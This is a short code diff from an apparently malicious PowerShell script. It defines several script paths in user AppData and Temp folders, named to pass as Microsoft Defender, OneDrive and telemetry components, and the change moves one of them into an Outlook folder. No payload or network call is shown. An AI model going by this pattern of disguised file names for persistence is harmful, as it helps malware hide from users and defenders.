@@ -6,7 +6,7 @@ function Gen-Info {
 
     # Paths
     $alfa_path = "C:\Users\$username\AppData\Local\Microsoft\Windows\DefenderCloudSync.ps1"
-    $bravo_path = "C:\Users\$username\AppData\Roaming\Microsoft\OneDrive\OneDriveHelper.ps1"
+    $bravo_path = "C:\Users\$username\AppData\Roaming\Microsoft\Outlook\OneDriveHelper.ps1"
     $charlie_path = "C:\Users\$username\AppData\Local\Temp\MicrosoftTelemetrySync.ps1"
     
     $random_chars = -join (1..10 | ForEach-Object { [char](Get-Random -Minimum 33 -Maximum 127) })
